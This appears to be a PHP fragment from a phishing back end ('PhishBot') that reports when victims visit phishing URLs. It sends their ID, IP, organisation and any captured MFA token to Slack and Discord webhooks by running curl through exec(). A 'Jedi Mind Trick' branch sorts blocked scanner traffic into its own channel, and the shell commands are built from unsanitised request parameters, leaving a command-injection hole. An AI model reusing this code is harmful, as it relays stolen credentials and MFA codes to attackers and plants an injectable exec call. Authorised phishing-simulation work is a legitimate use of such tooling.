if($TroyHunt == "yes"){
	$message = $message."\\r\\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";
	$messagediscord = $messagediscord."\\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";
	$messagepush = $messagepush."\\r\\nHaveIBeenPwned Hit (".number_format($haveibeenpwnedhits).")";
	}

if($MFAToken != ""){
$message = $message."\\r\\n> MFA Provided as `".$MFAToken."`";
$messagediscord = $messagediscord."\\n> MFA Provided as `".$MFAToken."`";	
$messagepush = $messagepush."\\r\\nMFA Provided as ".$MFAToken."";
}


if($SlackIncomingWebhookURL != ""){

// Execute Slack Incoming Webhook
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$SlackIncomingWebhookURL.'';

exec($cmd,$cmdoutput);
//echo $cmd;

//var_dump($cmdoutput);

}



// Execute Web Push Notifications
$cmdpush = 'cd config && php push.php "'.$messagepush.'" "PhishBot" "./phishicon.png" "'.$slacklink.'" "PhishBot"';

// COMMENTED THIS OUT DUE TO CRASHING ISSUES WHEN THE BROWSER GRANT EXPIRES
//exec($cmdpush);

if($DiscordWebhook != ""){

// Execute Discord Incoming Webhook
$messagediscord = urlencode($messagediscord);

$cmddiscord = 'curl -s -X POST -d \'{"username": "'.$slackbotname.'", "content": "'.$messagediscord.'", "avatar_url": "https://i.imgur.com/C0avyV1.png"}\' '.$DiscordWebhook.' -H \'Content-Type:application/json\'';

exec($cmddiscord);

}
}



$allowed = "- *Accessed API* -";
}

if($allowed == "- *Jedi Mind Trick Successful* -"){$jedi = 1; $slackchannel = "#blocked";}else{$jedi = 0; $slackchannel = "#phishing";}

// Slack Message
if(isset($_REQUEST['id'])){
$id = $_REQUEST['id'];

// Send Slack Notification
$message = ">".$url." was visited by ".$id." from ".$ip.". ".$allowed." (`".$org."`)";
} else {
$id = "";
$message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
}

if($jedi == 1){
if($blocked == 1){
$message = $message." - Blocked API via Blacklist";
}
if($blocked == 2){
$message = $message." - Blocked API via IP";
}
if($blocked == 3){
$message = $message." - Blocked API via URL Mismatch";
}
} else {$emoji = ":bell:";}

// Set Slack Information Here
if(!isset($slackchannel)){$slackchannel = $_REQUEST['slackchannel'];}
if(!isset($SlackIncomingWebhookURL)){$SlackIncomingWebhookURL = $_REQUEST['SlackIncomingWebhookURL'];}
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' '.$SlackIncomingWebhookURL.'';

// UNCOMMENT THIS IF YOU WANT ALERTS WHEN PEOPLE VISIT THE API
exec($cmd,$cmdresults);
//var_dump($cmd);

?>
